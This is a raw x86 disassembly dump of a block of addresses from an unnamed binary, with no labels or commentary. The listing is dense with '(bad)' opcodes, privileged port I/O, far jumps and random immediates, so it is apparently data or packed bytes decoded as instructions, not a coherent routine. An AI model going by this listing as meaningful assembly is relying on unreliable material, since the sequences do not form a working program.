  41d10e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d10f:	aam    0xa2
  41d111:	mov    ebp,0x21ddfb90
  41d116:	or     ah,BYTE PTR [eax]
  41d118:	imul   ecx,DWORD PTR [ecx],0xc466914d
  41d11e:	mov    bl,0x40
  41d120:	mov    ah,0xc9
  41d122:	xor    eax,0x4324a4ae
  41d127:	inc    edi
  41d128:	push   0x63a5f0c9
  41d12d:	cmp    edx,DWORD PTR [esi+edi*8+0xf]
  41d131:	aam    0xe1
  41d133:	(bad)  
  41d134:	stos   DWORD PTR es:[edi],eax
  41d135:	adc    BYTE PTR [ecx],cl
  41d137:	mov    ds:0x17e521ac,al
  41d13c:	mov    al,0x34
  41d13e:	or     BYTE PTR [eax],cl
  41d140:	sbb    bh,BYTE PTR [edi-0x1]
  41d143:	scas   eax,DWORD PTR es:[edi]
  41d144:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d145:	stos   DWORD PTR es:[edi],eax
  41d146:	and    DWORD PTR [esi-0x54034605],edx
  41d14c:	retf   0x41e7
  41d14f:	(bad)  
  41d150:	jecxz  0x41d1c9
  41d152:	lods   eax,DWORD PTR ds:[esi]
  41d153:	dec    ebp
  41d154:	jmp    0x41d10a
  41d156:	xchg   BYTE PTR [ebx],cl
  41d158:	test   al,0xea
  41d15a:	repnz pop es
  41d15c:	sub    BYTE PTR [ebx+0x6c91427a],al
  41d162:	inc    eax
  41d163:	sub    eax,0x6e1c874e
  41d168:	out    dx,eax
  41d169:	(bad)  
  41d16a:	pop    ebx
  41d16b:	add    al,0x30
  41d16d:	xchg   ebp,eax
  41d16e:	mov    al,ds:0x3933cc8
  41d173:	mov    bh,0x4
  41d175:	jl     0x41d17b
  41d177:	retf   
  41d178:	mov    ds:0x7b87aae8,al
  41d17d:	sub    dh,BYTE PTR [ebp-0x41]
  41d180:	mov    WORD PTR [esi+edi*4],cs
  41d183:	ror    BYTE PTR [esi+0x7386a25e],cl
  41d189:	leave  
  41d18a:	fucomi st,st(2)
  41d18c:	popf   
  41d18d:	test   al,0x80
  41d18f:	mov    ecx,0x462126e7
  41d194:	push   0x73
  41d196:	fs mov eax,0x20227967
  41d19c:	data16 or al,BYTE PTR [ecx-0x28f2f146]
  41d1a3:	jg     0x41d1c1
  41d1a5:	jae    0x41d1bf
  41d1a7:	xchg   DWORD PTR [edi],esi
  41d1a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d1aa:	sub    eax,0xb2122d87
  41d1af:	inc    edx
  41d1b0:	shl    cl,0x3f
  41d1b3:	mov    ebx,0xaa22a57c
  41d1b8:	cmp    BYTE PTR [edi],0xad
  41d1bb:	jo     0x41d1ae
  41d1bd:	test   BYTE PTR [edi-0x3],bh
  41d1c0:	push   0x976f0be3
  41d1c5:	es xchg edx,eax
  41d1c7:	and    ecx,DWORD PTR [eax]
  41d1c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d1ca:	mov    WORD PTR [esi-0x6f],es
  41d1cd:	push   ss
  41d1ce:	aam    0x88
  41d1d0:	ret    
  41d1d1:	mov    ds:0x1d4d6ebc,al
  41d1d6:	or     edi,DWORD PTR ss:[edi]
  41d1d9:	xchg   edi,eax
  41d1da:	or     al,BYTE PTR [ecx+0x63e0d2f7]
  41d1e0:	clc    
  41d1e1:	test   DWORD PTR [edi-0xe],esp
  41d1e4:	adc    BYTE PTR [ecx-0x73],bh
  41d1e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d1e8:	in     eax,0xc0
  41d1ea:	mov    esp,DWORD PTR [eax+0x50]
  41d1ed:	mov    ebx,0x62d1cd58
  41d1f2:	cdq    
  41d1f3:	std    
  41d1f4:	call   0x4e92:0x2cacdde
  41d1fb:	mov    al,0x47
  41d1fd:	fmul   st(0),st
  41d1ff:	fcomp  DWORD PTR [esp+esi*4+0x6c3a995e]
  41d206:	lds    esi,FWORD PTR ds:0x3d76c767
  41d20c:	lods   al,BYTE PTR ds:[esi]
  41d20d:	out    0x59,al
  41d20f:	sub    BYTE PTR [ecx-0x75],dh
  41d212:	inc    esp
  41d213:	nop
  41d214:	mov    eax,0x5c4bc59
  41d219:	mov    ch,0xfb
  41d21b:	inc    esi
  41d21c:	ins    BYTE PTR es:[edi],dx
  41d21d:	fxch   st(7)
  41d21f:	(bad)  
  41d220:	jecxz  0x41d287
  41d222:	jmp    0x41d254
  41d224:	iret   
  41d225:	nop
  41d226:	fisttp WORD PTR [ecx+0x40]
  41d229:	dec    ebp
  41d22a:	jecxz  0x41d1da
  41d22c:	popa   
  41d22d:	rcl    DWORD PTR [edx+edi*4-0x57b6d867],0x22
  41d235:	scas   eax,DWORD PTR es:[edi]
  41d236:	(bad)  
  41d237:	repz arpl WORD PTR [ebp+ebp*8-0xdc442b],cx
  41d23f:	adc    ecx,ebp
  41d241:	fnsave [esi-0x3b]
  41d244:	jnp    0x41d21d
  41d246:	js     0x41d228
  41d248:	(bad)  
  41d24a:	ret    0x6fdb
  41d24d:	lea    ebp,[eax+eiz*1]
  41d250:	cwde   
  41d251:	fimul  WORD PTR [eax+0x14f8c53f]
  41d257:	inc    eax
  41d258:	mov    ch,BYTE PTR [edx-0x38cf2d7a]
  41d25e:	or     al,0x57
  41d260:	pusha  
  41d261:	dec    ebx
  41d262:	aaa    
  41d263:	out    dx,eax
  41d264:	pop    ebx
  41d265:	pop    eax
  41d266:	sbb    cl,BYTE PTR [ebx]
  41d268:	or     dh,BYTE PTR [edi-0x6ac3336e]
  41d26e:	jbe    0x41d284
  41d270:	stc    
  41d271:	in     al,0x85
  41d273:	jmp    0x41d263
  41d275:	test   al,0xc4
  41d277:	inc    edi
  41d278:	outs   dx,BYTE PTR ds:[esi]
  41d279:	(bad)
  41d27d:	out    dx,eax
  41d27e:	gs adc edx,esp
  41d281:	inc    esi
  41d282:	not    BYTE PTR [edi-0x63]
  41d285:	inc    esp
  41d286:	pusha  
  41d287:	mov    ecx,0x12c6e468
  41d28c:	dec    edi
  41d28d:	mov    eax,0xe49257f6
  41d292:	xchg   ecx,eax
  41d293:	pop    ecx
  41d294:	sub    bh,bh
  41d296:	faddp  st(5),st
  41d298:	pop    ss
  41d299:	push   es
  41d29a:	gs mov ch,0xf2
  41d29d:	or     BYTE PTR [esi-0x29],ah
  41d2a0:	dec    bl
  41d2a2:	sub    ah,BYTE PTR [ebp-0x3d]
  41d2a5:	fldcw  WORD PTR [ecx+0x475d6a9a]
  41d2ab:	or     eax,0x7222cd87
  41d2b0:	mov    al,ds:0x5c147b24
  41d2b5:	pop    edi
  41d2b6:	and    BYTE PTR fs:[eax-0xe],al
  41d2ba:	retf   0x456b
  41d2bd:	sbb    DWORD PTR [ebp+edi*8+0x1c],0x69479788
  41d2c5:	add    ch,BYTE PTR [esi]
  41d2c7:	adc    esi,DWORD PTR [edx-0x1b010bd7]
  41d2cd:	sub    eax,0x6250576e
  41d2d2:	sbb    eax,DWORD PTR ss:[edx-0x71131a79]
  41d2d9:	shl    BYTE PTR [ebx],cl
  41d2db:	push   0x52
  41d2dd:	sbb    dh,bh
  41d2df:	jnp    0x41d305
  41d2e1:	add    BYTE PTR [edx+ecx*8-0x42e72bf0],bh
  41d2e8:	and    BYTE PTR [eax+0x21ba331a],dh
  41d2ee:	mov    bh,BYTE PTR [eax+0x34]
  41d2f1:	daa    
  41d2f2:	daa    
  41d2f3:	mov    dl,BYTE PTR [edx-0x2e]
  41d2f6:	ss push edx
  41d2f8:	loop   0x41d300
  41d2fa:	adc    DWORD PTR [esi-0x16],edx
  41d2fd:	pop    ecx
  41d2fe:	xchg   ebx,eax
  41d2ff:	cwde   
  41d300:	daa    
  41d301:	jle    0x41d2e3
  41d303:	ja     0x41d332
  41d305:	push   ds
  41d306:	push   esi
  41d307:	daa    
  41d308:	scas   al,BYTE PTR es:[edi]
  41d309:	outs   dx,DWORD PTR ds:[esi]
  41d30a:	mov    al,ds:0x2f4afe69
  41d30f:	pop    edx
  41d310:	imul   edi,DWORD PTR ds:0x3776e445,0xf7078388
  41d31a:	jecxz  0x41d2ba
  41d31c:	in     al,0x70
  41d31e:	push   0x7a
  41d320:	loop   0x41d310
  41d322:	mov    ebx,0x6b3fd266
  41d327:	jmp    0xd26b:0x2e2f18a7
  41d32e:	jp     0x41d365
  41d330:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d331:	mov    al,ds:0xde56d1cf
  41d336:	into   
  41d337:	ja     0x41d2d4
  41d339:	push   esp
  41d33a:	pop    ecx
  41d33b:	cs jmp 0x41d2fe
  41d33e:	sub    BYTE PTR [ebx+0x25],dl
  41d341:	add    bl,BYTE PTR [esi]
  41d343:	fimul  DWORD PTR [esi+edx*1+0x365508d3]
  41d34a:	push   ebx
  41d34b:	outs   dx,DWORD PTR ds:[esi]
  41d34c:	mov    dl,BYTE PTR [ecx]
  41d34e:	or     edi,edx
  41d350:	sahf   
  41d351:	out    0x5c,al
  41d353:	loope  0x41d3af
  41d355:	cwde   
  41d356:	fs cmp dh,cl
  41d359:	ret    
  41d35a:	mov    eax,0x1e97f586
  41d35f:	fild   WORD PTR [edx+0x34793eee]
  41d365:	dec    ebx
  41d366:	jl     0x41d32d
  41d368:	adc    ebp,DWORD PTR [edi+0x9]
  41d36b:	pop    ecx
  41d36c:	dec    ebp
  41d36d:	sti    
  41d36e:	cs pop edi
  41d370:	jp     0x41d318
  41d372:	jmp    0x1d533653
  41d377:	popf   
  41d378:	lods   eax,DWORD PTR ds:[esi]
  41d379:	outs   dx,DWORD PTR ds:[esi]
  41d37a:	nop
  41d37b:	and    bh,bl
  41d37d:	lods   eax,DWORD PTR ds:[esi]
  41d37e:	push   es
  41d37f:	loop   0x41d362
  41d381:	hlt    
  41d382:	xor    eax,0x26ef40f2
  41d387:	aam    0xd2
  41d389:	arpl   WORD PTR [eax-0x7f],di
  41d38c:	xchg   edx,eax
  41d38d:	mov    dl,0x62
  41d38f:	out    0x62,al
  41d391:	jl     0x41d32b
  41d393:	dec    ebp
  41d394:	xor    edx,DWORD PTR [ecx]
  41d396:	push   ds
  41d397:	mov    dl,0x50
  41d399:	xchg   esp,eax
  41d39a:	test   DWORD PTR [edx],esp
  41d39c:	test   eax,0x89b1a7b7
  41d3a1:	add    edx,DWORD PTR [eax+eiz*1+0xc2dd53f]
  41d3a8:	push   0xffffffc9
  41d3aa:	push   ds
  41d3ab:	add    eax,0xbf18130a
  41d3b0:	xor    eax,0x2bf94a0
  41d3b5:	repz sbb ebx,DWORD PTR [edi+edi*4+0x71acf44a]
  41d3bd:	push   0xfffffffe
  41d3bf:	inc    ecx
  41d3c0:	in     eax,dx
  41d3c1:	fnstsw WORD PTR [esi+0x45ca5f02]
  41d3c7:	std    
  41d3c8:	dec    ebx
  41d3c9:	pop    esi
  41d3ca:	cmp    eax,0x2bf8da6b
  41d3cf:	test   DWORD PTR [edx],edx
  41d3d1:	mov    ah,0x95
  41d3d3:	mov    ecx,0xb9404f59
  41d3d8:	inc    ebp
  41d3d9:	sbb    BYTE PTR [esi+0x61],bl
  41d3dc:	ret    0xd4ca
  41d3df:	sbb    cl,BYTE PTR [esi]
  41d3e1:	mul    cl
  41d3e3:	mov    ds,WORD PTR [edi]
  41d3e5:	fwait
  41d3e6:	pop    ebx
  41d3e7:	cmp    bl,ch
  41d3e9:	sbb    eax,0x50cc918d
  41d3ee:	fucomi st,st(7)
  41d3f0:	(bad)  
  41d3f1:	and    eax,0x32c2ff50
  41d3f6:	and    eax,0x2734adff
  41d3fb:	or     ebp,DWORD PTR [esi+0x3d644132]
  41d401:	adc    DWORD PTR [edx-0x2e],edi
  41d404:	jbe    0x41d44d
  41d406:	(bad)  
  41d407:	call   0x995a:0xa9d09893
  41d40e:	pop    ebp
  41d40f:	hlt    
  41d410:	sbb    eax,0xe100bdf1
  41d415:	adc    esi,DWORD PTR [ebp+0x5]
  41d418:	cmp    dl,BYTE PTR [esi+0x59]
  41d41b:	cmp    ecx,DWORD PTR [ecx+0x51]
  41d41e:	push   cs
  41d41f:	sbb    BYTE PTR [edi+0x5413dbf4],cl
  41d425:	ret    
  41d426:	retf   0x6232
  41d429:	xor    BYTE PTR [eax],bh
  41d42b:	jl     0x41d49a
  41d42d:	and    bl,BYTE PTR [edi+edx*2]
  41d430:	mov    edx,0x77718
  41d435:	test   eax,0xc485b166
  41d43a:	popf   
  41d43b:	shl    DWORD PTR [ecx-0x26],1
  41d43e:	add    ecx,ecx
  41d440:	pop    ss
  41d441:	icebp  
  41d442:	push   ss
  41d443:	hlt    
  41d444:	iret   
  41d445:	jmp    0x8e6:0x5f1ff9a5
  41d44c:	cli    
  41d44d:	mov    DWORD PTR [edi],ebp
  41d44f:	xchg   BYTE PTR [edi],ch
  41d451:	sub    DWORD PTR [ecx],0x34
  41d454:	push   esi
  41d455:	stos   DWORD PTR es:[edi],eax
  41d456:	push   cs
  41d457:	shl    bh,1
  41d459:	xchg   ebx,eax
  41d45a:	inc    ebx
  41d45b:	add    dh,BYTE PTR [ebx+edx*8+0x63]
  41d45f:	push   ebx
  41d460:	or     DWORD PTR [eax-0x22],edx
  41d463:	jnp    0x41d407
  41d465:	adc    ebx,DWORD PTR [ecx+0x577d4d8f]
  41d46b:	jae    0x41d468
  41d46d:	pop    eax
  41d46e:	aad    0xc0
  41d470:	push   esi
  41d471:	call   0xfe49:0xec94fa50
  41d478:	or     DWORD PTR [ecx],0x72
  41d47b:	pop    edx
  41d47c:	fidivr WORD PTR [ebx+0x7e]
  41d47f:	test   eax,0x896af097
  41d484:	mov    al,ds:0x22093082
  41d489:	cs nop
  41d48b:	fcmovnu st,st(6)
  41d48d:	dec    ebp
  41d48e:	push   es
  41d48f:	cli    
  41d490:	test   al,0xdc
  41d492:	aas    
  41d493:	dec    edi
  41d494:	dec    edi
  41d495:	out    0x82,eax
  41d497:	jmp    0xc76e8cc5
  41d49c:	loop   0x41d422
  41d49e:	ins    BYTE PTR es:[edi],dx
  41d49f:	sbb    eax,0x7343e61c
  41d4a4:	clc    
  41d4a5:	xor    eax,0xa6f8fbd8
  41d4aa:	dec    edi
  41d4ab:	sbb    esp,DWORD PTR [edx-0x65]
  41d4ae:	jo     0x41d52a
  41d4b0:	sub    eax,0xc057214c
  41d4b5:	jae    0x41d4bb
  41d4b7:	xor    ch,BYTE PTR [eax+eiz*2]
  41d4ba:	ja     0x41d458
  41d4bc:	pop    ebx
  41d4bd:	xlat   BYTE PTR ds:[ebx]
  41d4be:	adc    DWORD PTR [eax-0x5107e1a6],0xffffffe1
  41d4c5:	into   
  41d4c6:	jl     0x41d52a
  41d4c8:	cli    
  41d4c9:	pop    es
  41d4ca:	(bad)  
  41d4cb:	(bad)  
  41d4cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d4cd:	mov    cl,BYTE PTR [ecx-0x43baf05a]
  41d4d3:	inc    edi
  41d4d4:	rcr    DWORD PTR [esi],cl
  41d4d6:	test   BYTE PTR [esi-0x2aa0055d],cl
  41d4dc:	or     eax,0x214fb0f0
  41d4e1:	jecxz  0x41d4e9
  41d4e3:	and    al,0x64
  41d4e5:	clc    
  41d4e6:	bound  esp,QWORD PTR [esi]
  41d4e8:	or     edx,DWORD PTR [ecx-0x2d]
  41d4eb:	add    BYTE PTR [esi-0x51cfc846],bh
  41d4f1:	repnz mov eax,0xdc00898e
  41d4f7:	mov    ch,0xd6
  41d4f9:	es inc dx
  41d4fc:	push   edx
  41d4fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d4fe:	jg     0x41d545
  41d500:	sbb    edx,DWORD PTR [edx+0x19abf494]
  41d506:	pop    esp
  41d507:	mov    cl,0x8b
  41d509:	pusha  
  41d50a:	pop    ss
  41d50b:	and    DWORD PTR ds:0x80baf357,ebx
  41d511:	and    BYTE PTR [eax],bl
  41d513:	inc    ebx
  41d514:	xchg   edx,eax
  41d515:	outs   dx,BYTE PTR ds:[esi]
  41d516:	daa    
  41d517:	and    al,0x71
  41d519:	es sub eax,0x99a662f6
  41d51f:	sub    eax,0x104a863c
  41d524:	xchg   esp,eax
  41d525:	cld    
  41d526:	(bad)  
  41d527:	fs inc edx
  41d529:	sbb    al,0x89
  41d52b:	cmc    
  41d52c:	ret    0x7218
  41d52f:	cmp    ebp,DWORD PTR [ecx-0x23386a76]
  41d535:	inc    esi
  41d536:	stos   BYTE PTR es:[edi],al
  41d537:	test   eax,0xf9fbe2d1
  41d53c:	dec    ebx
  41d53d:	xor    BYTE PTR ds:0x68c1b931,0xe0
  41d544:	aas    
  41d545:	lock xchg esp,eax
  41d547:	lods   eax,DWORD PTR ds:[esi]
  41d548:	(bad)  
  41d549:	lods   al,BYTE PTR ds:[esi]
  41d54a:	mov    bl,0xc
  41d54c:	pop    ss
  41d54d:	cdq    
  41d54e:	pop    ss
  41d54f:	or     ebx,DWORD PTR ds:0x98b7b37f
  41d555:	or     bh,dl
  41d557:	arpl   WORD PTR [ebx+eax*8+0x5dd9c2ba],sp
  41d55e:	mov    cl,0xbc
  41d560:	add    al,0x22
  41d562:	ins    BYTE PTR es:[edi],dx
  41d563:	xchg   edx,eax
  41d564:	inc    eax
  41d565:	inc    ebx
  41d566:	jae    0x41d560
  41d568:	adc    eax,0x22fc0bbc
  41d56d:	push   edx
  41d56e:	cdq    
  41d56f:	push   eax
  41d570:	push   ecx
  41d571:	fs dec ebp
  41d573:	rcl    BYTE PTR [eax],0x7f
  41d576:	std    
  41d577:	xchg   ecx,eax
  41d578:	fisubr DWORD PTR [ecx+0x74]
  41d57b:	lds    eax,FWORD PTR ds:0xb6657397
  41d581:	pop    ds
  41d582:	daa    
  41d583:	in     eax,0x5b
  41d585:	push   esi
  41d586:	daa    
  41d587:	outs   dx,DWORD PTR ds:[esi]
  41d588:	and    edi,DWORD PTR [ebp-0x143cfc7]
  41d58e:	sbb    eax,0x9ee61a2d
  41d593:	or     al,0xbf
  41d595:	push   edi
  41d596:	adc    al,0x57
  41d598:	imul   ebx,DWORD PTR [eax-0x4a],0x51
  41d59c:	mov    al,0xd1
  41d59e:	xchg   esp,eax
  41d59f:	cld    
  41d5a0:	repnz push cs
  41d5a2:	btr    DWORD PTR [ecx],edi
  41d5a5:	cs repz and eax,0x6809a55
  41d5ac:	addr16 mov ebp,0x9f9db682
  41d5b2:	sar    BYTE PTR [edx-0x4e],cl
  41d5b5:	cs icebp 
  41d5b7:	stc    
  41d5b8:	jbe    0x41d60e
  41d5ba:	mov    esp,0x80a3f1e9
  41d5bf:	dec    eax
  41d5c0:	xor    bl,ch
  41d5c2:	xchg   ecx,eax
  41d5c3:	sbb    esi,ebp
  41d5c5:	xchg   esi,eax
  41d5c6:	or     eax,0xeb353c2f
  41d5cb:	std    
  41d5cc:	push   ss
  41d5cd:	mov    ?,WORD PTR [ecx]
  41d5cf:	cld    
  41d5d0:	repz push edi
  41d5d2:	(bad)  
  41d5d3:	test   eax,0xb68c2da2
  41d5d8:	xor    DWORD PTR [ebx-0x49],ebp
  41d5db:	fwait
  41d5dc:	pop    esi
  41d5dd:	inc    ecx
  41d5de:	jmp    0x394f:0xdbcbec65
  41d5e5:	bound  ebx,QWORD PTR [ecx]
  41d5e7:	jnp    0x41d5c1
  41d5e9:	addr16 dec eax
  41d5eb:	dec    eax
  41d5ec:	mov    bh,0xb
  41d5ee:	cli    
  41d5ef:	sbb    eax,0xbf2b5356
  41d5f4:	call   0x74a4:0x2f385847
  41d5fb:	cmc    
  41d5fc:	and    al,0x17
  41d5fe:	push   edi
  41d5ff:	popa   
  41d600:	push   esi
  41d601:	xchg   edi,eax
  41d602:	mov    bh,0x12
  41d604:	stos   BYTE PTR es:[edi],al
  41d605:	fld    TBYTE PTR [ecx+0x7073b226]
  41d60b:	inc    DWORD PTR [esp+ecx*8]
  41d60e:	ror    DWORD PTR [ebx-0x6c9ad6f4],1
  41d614:	dec    esp
  41d615:	mov    ebx,?
  41d617:	(bad)  
  41d618:	adc    ah,dh
  41d61a:	adc    bh,cl
  41d61c:	mov    es,edx
  41d61e:	call   FWORD PTR [ebp-0x65]
  41d621:	mov    edx,0x52473434
  41d626:	jb     0x41d669
  41d628:	sbb    edi,edx
  41d62a:	es dec eax
  41d62c:	mov    al,0x77
  41d62e:	push   es
  41d62f:	mov    ah,0x88
  41d631:	vpcmpeqw xmm7,xmm4,xmm3
  41d635:	stos   BYTE PTR es:[edi],al
  41d636:	sub    ecx,DWORD PTR [ebp-0x17]
  41d639:	xor    al,0x6
  41d63b:	ret    
  41d63c:	popf   
  41d63d:	(bad)  
  41d63e:	stc    
  41d63f:	sbb    edx,DWORD PTR [ebx+ecx*2-0x121a8e19]
  41d646:	fwait
  41d647:	pop    ss
  41d648:	mov    edx,DWORD PTR [eax-0x61e0e356]
  41d64e:	call   0x5086:0x2b1e0e07
  41d655:	push   eax
  41d656:	mov    edx,0x11c5f30e
  41d65b:	fimul  DWORD PTR [edi+0xe]
  41d65e:	adc    esi,edi
  41d660:	ffree  st(4)
  41d662:	dec    ecx
  41d663:	int3   
  41d664:	shr    DWORD PTR [ebp-0x22],cl
  41d667:	cdq    
  41d668:	fisub  DWORD PTR [ebp+0x4a699c53]
  41d66e:	push   ebx
  41d66f:	ror    DWORD PTR [esp+edi*1-0x64],0xb7
  41d674:	pop    ss
  41d675:	mov    dh,0x1e
  41d677:	dec    esp
  41d678:	xchg   ebp,eax
  41d679:	jo     0x41d677
  41d67b:	iret   
  41d67c:	popf   
  41d67d:	inc    edx
  41d67f:	xor    BYTE PTR [eax-0x7d1e2998],ch
  41d685:	xor    ecx,DWORD PTR ds:0x6d15480b
  41d68b:	or     DWORD PTR [esi+0x5c5eed6a],ecx
  41d691:	idiv   BYTE PTR [ebp-0x63]
  41d694:	push   edx
  41d695:	das    
  41d696:	cld    
  41d697:	rcr    BYTE PTR [esi],cl
  41d699:	ret    0xd08e
  41d69c:	ret    0xd910
  41d69f:	test   eax,0x21f298ea
  41d6a4:	adc    ebx,edi
  41d6a6:	rcr    DWORD PTR [edi],cl
  41d6a8:	jecxz  0x41d68e
  41d6aa:	out    0xb6,al
  41d6ac:	js     0x41d654
  41d6ae:	div    DWORD PTR [esi-0x7b]
  41d6b1:	aas    
  41d6b2:	in     eax,0xae
  41d6b4:	arpl   WORD PTR [edx+edi*1-0x68978246],bx
  41d6bb:	lds    edx,FWORD PTR [ecx+0x2a]
  41d6be:	cmp    edi,edx
  41d6c0:	sub    esi,DWORD PTR [ebp-0xa]
  41d6c3:	add    bh,BYTE PTR [edx]
  41d6c5:	(bad)  
  41d6c7:	mov    eax,0x755bcb6b
  41d6cc:	cld    
  41d6cd:	in     eax,dx
  41d6ce:	pop    esp
  41d6cf:	in     eax,0x74
  41d6d1:	and    ebx,ebx
  41d6d3:	imul   ebp,ecx,0x70f1a31b
  41d6d9:	sbb    cl,BYTE PTR [edx+0x42]
  41d6dc:	gs adc al,0x65
  41d6df:	and    al,0x54
  41d6e1:	test   al,0x10
  41d6e3:	std    
  41d6e4:	test   DWORD PTR ds:0x3c793c71,ebp
  41d6ea:	cdq    
  41d6eb:	dec    esi
  41d6ec:	jmp    0x6428c7b3
  41d6f1:	jbe    0x41d74f
  41d6f3:	outs   dx,BYTE PTR ds:[esi]
  41d6f4:	dec    eax
  41d6f5:	push   ss
  41d6f6:	mov    BYTE PTR [eax+0x288e4273],0x10
  41d6fd:	repz add DWORD PTR [eax+0x50],0x3d665bba
  41d705:	or     edx,edi
  41d707:	dec    eax
  41d708:	adc    DWORD PTR [ebx+0x30],ecx
  41d70b:	dec    edx
  41d70c:	stos   BYTE PTR es:[edi],al
  41d70d:	bound  esi,QWORD PTR [edx-0x74]
  41d710:	push   ss
  41d711:	mov    ecx,0xc7445fa0
  41d716:	fdiv   DWORD PTR [edi-0x7f6fbe29]
  41d71c:	pusha  
  41d71d:	fisub  WORD PTR [ebx]
  41d71f:	jle    0x41d6e7
  41d721:	cmp    BYTE PTR [ebx],cl
  41d723:	out    dx,eax
  41d724:	add    eax,0xd4e17264
  41d729:	test   eax,0x89c1201d
  41d72e:	or     DWORD PTR [edi-0x46],esi
  41d731:	add    eax,0xbe0a0d94
  41d736:	popa   
  41d737:	xchg   DWORD PTR [edi],esp
  41d739:	into   
  41d73a:	mov    DWORD PTR [edi+esi*8-0x18],ebx
  41d73e:	mov    dh,BYTE PTR [ecx+ecx*1+0x6980aa7c]
  41d745:	cmp    al,0x23
  41d747:	into   
  41d748:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d749:	in     eax,0x3c
  41d74b:	or     DWORD PTR [eax+0x2a],0xf2b49020
  41d752:	sub    eax,0x4707ccc9
  41d757:	into   
  41d758:	jl     0x41d75f
  41d75a:	std    
  41d75b:	pop    edx
  41d75c:	push   ds
  41d75d:	push   cs
  41d75e:	push   edx
  41d75f:	or     cl,BYTE PTR [edx+0x73f71691]
  41d765:	in     al,dx
  41d766:	xchg   BYTE PTR [esp+edi*4-0x12],dl
  41d76a:	jbe    0x41d743
  41d76c:	push   eax
  41d76d:	or     bh,ch
  41d76f:	nop
  41d770:	mov    ds:0x1e1e3353,eax
  41d775:	stos   DWORD PTR es:[edi],eax
  41d776:	call   0x3316:0x29e86610
  41d77d:	ss cld 
  41d77f:	xor    DWORD PTR [ecx],0xfad75409
  41d785:	cdq    
  41d786:	in     eax,0x95
  41d788:	adc    dl,0xf8
  41d78b:	retf   
  41d78c:	int    0xa
  41d78e:	les    eax,FWORD PTR [eax+0x17112c4d]
  41d794:	mov    esi,0x8bbd2740
  41d799:	add    bh,bh
  41d79b:	mov    ds:0xbf19c36c,eax
  41d7a0:	adc    esp,0xa
  41d7a3:	cwde   
  41d7a4:	sub    ecx,edx
  41d7a6:	aas    
  41d7a7:	(bad)  
  41d7a8:	mov    edi,0x34aab891
  41d7ad:	xchg   ecx,eax
  41d7ae:	outs   dx,DWORD PTR ds:[esi]
  41d7af:	mov    esi,0x59f0e176
  41d7b4:	adc    ah,ch
  41d7b6:	out    dx,eax
  41d7b7:	imul   edx,DWORD PTR [ebx-0x66],0xffffff95
  41d7bb:	cld    
  41d7bc:	out    dx,eax
  41d7bd:	in     al,0x87
  41d7bf:	repnz iret 
  41d7c1:	mov    ah,0x54
  41d7c3:	mov    ebx,0xdc72b6ef
  41d7c8:	ins    DWORD PTR es:[edi],dx
  41d7c9:	dec    ecx
  41d7ca:	pop    es
  41d7cb:	xchg   edx,eax
  41d7cc:	sbb    bh,BYTE PTR [ebx]
  41d7ce:	or     eax,0xa240715b
  41d7d3:	outs   dx,DWORD PTR ds:[esi]
  41d7d4:	das    
  41d7d5:	dec    ebx
  41d7d6:	ds mov edx,0xa0e97b
  41d7dc:	pop    ss
  41d7dd:	es jae 0x41d79a
  41d7e0:	aam    0x2e
  41d7e2:	ret    
  41d7e3:	add    BYTE PTR [edi],bh
  41d7e5:	xchg   edi,eax
  41d7e6:	je     0x41d77b
  41d7e8:	aas    
  41d7e9:	push   ebx
  41d7ea:	(bad)  
  41d7eb:	cwde   
  41d7ec:	dec    eax
  41d7ed:	xchg   sp,ax
  41d7ef:	dec    edx
  41d7f0:	mov    DWORD PTR [edi-0x15],eax
  41d7f3:	fnsave [ebx]
  41d7f5:	cmp    eax,0xc9acfdb1
  41d7fa:	sub    al,0x88
  41d7fc:	enter  0xa3e8,0x80
  41d800:	and    ch,bl
  41d802:	or     BYTE PTR [ebp-0x3b2ae15d],cl
  41d808:	stos   DWORD PTR es:[edi],eax
  41d809:	jnp    0x41d7c9
  41d80b:	sub    bh,0x68
  41d80e:	rol    ebp,cl
  41d810:	adc    al,0xca
  41d812:	ds push ss
  41d814:	mov    ds:0xca7a21b,eax
  41d819:	bound  ecx,QWORD PTR [ecx+0x76338655]
  41d81f:	ss sti 
  41d821:	test   DWORD PTR [edi-0x4eeff8a6],eax
  41d827:	xchg   ebp,eax
  41d828:	or     ch,BYTE PTR [ecx+0x74]
  41d82b:	fld    DWORD PTR [ecx]
  41d82d:	xor    ch,BYTE PTR ds:0xe1f7eddb
  41d833:	fptan  
  41d835:	lods   eax,DWORD PTR ds:[esi]
  41d836:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d837:	rcl    DWORD PTR [edx+0xf41e939],0x9c
  41d83e:	cmp    dh,BYTE PTR [eax-0x6b622902]
  41d844:	ror    dl,0x26
  41d847:	mov    edx,0x27865809
  41d84c:	imul   edi,ebp,0xd
  41d84f:	xchg   esp,eax
  41d850:	sahf   
  41d851:	int    0xc9
  41d853:	pusha  
  41d854:	cs add al,0x2c
  41d857:	mov    ebx,0x36b584aa
  41d85c:	out    0x18,al
  41d85e:	sbb    al,0x7c
  41d860:	sti    
  41d861:	dec    esi
  41d862:	in     al,dx
  41d863:	(bad)  
  41d864:	loopne 0x41d850
  41d866:	xchg   edi,eax
  41d867:	sub    edx,DWORD PTR [ebp+ebx*4+0x610a4e00]
  41d86e:	cmp    BYTE PTR [eax-0x30],cl
  41d871:	add    al,0xce
  41d873:	in     al,0xa2
  41d875:	lods   al,BYTE PTR ds:[esi]
  41d876:	mov    ebx,0x1959a300
  41d87b:	jecxz  0x41d8e4
  41d87d:	push   edi
  41d87e:	push   eax
  41d87f:	inc    ebx
  41d880:	push   ds
  41d881:	sub    ebx,DWORD PTR [ecx]
  41d883:	mov    edi,0x28f68a20
  41d888:	push   ebp
  41d889:	shl    BYTE PTR [eax+0x40],0xf7
  41d88d:	xor    dl,BYTE PTR [edi]
  41d88f:	into   
  41d890:	cmc    
  41d891:	pop    ds
  41d892:	pop    ebp
  41d893:	inc    eax
  41d894:	hlt    
  41d895:	or     DWORD PTR [ecx+0x57eb8b55],esi
  41d89b:	xor    al,0x1c
